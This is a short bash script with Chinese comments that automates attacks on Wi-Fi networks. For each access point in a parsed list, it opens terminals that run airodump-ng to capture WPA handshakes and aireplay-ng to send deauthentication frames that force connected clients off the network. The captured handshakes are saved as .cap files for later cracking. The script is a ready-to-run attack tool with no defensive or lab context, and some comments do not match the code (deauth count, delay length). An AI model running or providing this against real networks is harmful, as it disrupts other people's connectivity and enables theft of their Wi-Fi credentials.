#!/bin/bash

# 設定參數
INTERFACE="wlan0mon"  # 確認是否正確
HANDSHAKE_DIR="/home/toki/hands"
PARSED_FILE="parsed_ap_list.txt"

# 如果 handshake 目錄不存在，創建它
if [ ! -d "$HANDSHAKE_DIR" ]; then
  sudo mkdir -p "$HANDSHAKE_DIR"
fi

# 從解析文件中逐一處理每個 AP
while IFS=, read -r line
do
    BSSID=$(echo $line | awk -F', ' '{print $1}' | cut -d' ' -f2)
    CHANNEL=$(echo $line | awk -F', ' '{print $2}' | cut -d' ' -f2)
    ESSID=$(echo $line | awk -F', ESSID:' '{print $2}')

    if [ "$CHANNEL" -gt 0 ]; then
        echo "正在處理 AP，BSSID: $BSSID, 頻道: $CHANNEL, ESSID: $ESSID"
        
        # 使用 gnome-terminal 進行 airodump-ng 捕捉，終端執行完自動關閉
        gnome-terminal -- bash -c "sudo timeout 80 airodump-ng --bssid $BSSID -c $CHANNEL -w '$HANDSHAKE_DIR/$ESSID' $INTERFACE"
        
        # 並行執行 deauthentication 攻擊，進行 10 次 deauth 攻擊，終端執行完自動關閉
        gnome-terminal -- bash -c "sudo aireplay-ng --deauth 15 -a $BSSID $INTERFACE"
        
        # 延遲 5 秒等待處理下一個 AP
        sleep 80

        # 檢查是否成功擷取到握手包
        if ls "$HANDSHAKE_DIR/$ESSID"-*.cap 1> /dev/null 2>&1; then
            echo "成功擷取握手包：$HANDSHAKE_DIR/$ESSID-01.cap"
        else
            echo "未成功擷取到握手包：$ESSID"
        fi
        
        echo "繼續處理下一個 AP..."
    else
        echo "頻道數據不正確，跳過此 AP：$BSSID"
    fi

done < "$PARSED_FILE"

echo "所有 AP 都已處理完畢，握手包已儲存至 $HANDSHAKE_DIR。"
